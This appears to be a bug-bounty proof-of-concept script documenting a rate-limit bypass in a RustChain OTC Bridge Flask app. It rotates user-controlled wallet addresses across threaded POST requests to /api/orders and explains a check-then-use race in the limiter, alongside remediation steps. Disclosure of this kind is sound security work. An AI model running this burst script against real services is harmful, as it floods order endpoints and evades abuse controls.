#!/usr/bin/env python3
"""
RustChain Security PoC — FINDING-5
MEDIUM: Rate Limiting Bypass via Wallet Rotation + No Concurrency Control

Bounty: #2867 | Severity: MEDIUM | Reward: 25 RTC
Auditor: zhaog100 (小米辣)

Vulnerability:
  The OTC Bridge rate limiter (Database.check_rate_limit) uses 
  IP + wallet_address as the identifier:
  
      identifier = f"{request.remote_addr}:{request.json.get('wallet_address', '')}"
  
  Attackers can bypass this by:
  1. Rotating wallet_address in each request (user-controlled field)
  2. Using different IPs (easy with proxies/VPNs)
  
  Additionally, Flask's threaded mode has NO concurrency control:
  - Rate limit check and increment are not atomic
  - Race condition allows bursts beyond the limit
  - In-memory state is lost on restart (no persistence)

Impact:
  - DDoS attacks on OTC bridge endpoints
  - Brute force attacks on order/trade IDs
  - Scraping of all orders and trade data
  - Abuse of escrow operations

Affected Code:
  - otc-bridge/app.py: Database.check_rate_limit() (lines 205-229)
  - otc-bridge/app.py: rate_limit decorator (lines 369-385)

REMEDIATION:
  1. Use fixed identifiers (IP only, or authenticated user ID)
  2. Add atomic operations (Redis INCR, or thread locks)
  3. Persist rate limit state (SQLite, Redis)
  4. Add global rate limits (per-IP regardless of wallet)
  5. Use Flask-Limiter or similar proven library
"""

import requests
import threading
import time
import sys


def poc_rate_limit_bypass(base_url: str):
    """Demonstrate rate limit bypass via wallet rotation."""
    print("=" * 60)
    print("FINDING-5 PoC: Rate Limit Bypass via Wallet Rotation")
    print("=" * 60)
    
    print("\n[*] Rate limit config: 10 requests per 60 seconds per IP+wallet")
    print("[*] Attack: Rotate wallet_address to bypass limit\n")
    
    results = []
    
    def send_request(i):
        wallet = f"0xAttacker{i:04d}"  # Different wallet each time
        try:
            resp = requests.post(f"{base_url}/api/orders", json={
                "wallet_address": wallet,
                "order_type": "buy",
                "crypto_asset": "ETH",
                "rtc_amount": 1,
                "price_per_rtc": 0.01
            }, timeout=5)
            results.append((i, resp.status_code, resp.text[:50]))
        except Exception as e:
            results.append((i, "ERROR", str(e)[:50]))
    
    # Send 15 requests with different wallets (limit is 10 per wallet)
    threads = []
    for i in range(15):
        t = threading.Thread(target=send_request, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.05)  # Small delay to avoid connection issues
    
    for t in threads:
        t.join(timeout=10)
    
    # Analyze results
    success = sum(1 for _, code, _ in results if code == 200)
    rate_limited = sum(1 for _, code, _ in results if code == 429)
    errors = sum(1 for _, code, _ in results if code == "ERROR")
    
    print(f"\nResults: {success} succeeded, {rate_limited} rate-limited, {errors} errors")
    
    if success > 10:
        print("🔴 RATE LIMIT BYPASSED: More than 10 requests succeeded!")
        return True
    elif success > 0:
        print("🟠 Partial bypass or node not running")
        return False
    else:
        print("⚪  Node not running — code analysis confirms vulnerability")
        return False


def poc_concurrency_race(base_url: str):
    """Demonstrate race condition in rate limiting."""
    print("\n" + "=" * 60)
    print("FINDING-5 PoC: Race Condition in Rate Limit Check")
    print("=" * 60)
    
    print("""
The rate_limit decorator has a TOCTOU race condition:

    def decorated_function(*args, **kwargs):
        identifier = f"{request.remote_addr}:{request.json.get('wallet_address', '')}"
        if not db.check_rate_limit(identifier):  # ← CHECK
            return jsonify({"error": "Rate limit exceeded"}), 429
        return f(*args, **kwargs)                   # ← USE

Between check_rate_limit() returning True and the request being processed,
another thread can also pass the check. In Flask's threaded mode, this
allows concurrent bursts beyond the configured limit.

With 10 concurrent requests arriving simultaneously, ALL 10 could pass
the check before any of them increments the counter.
""")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:5000"
    
    poc_concurrency_race(base_url)
    poc_rate_limit_bypass(base_url)
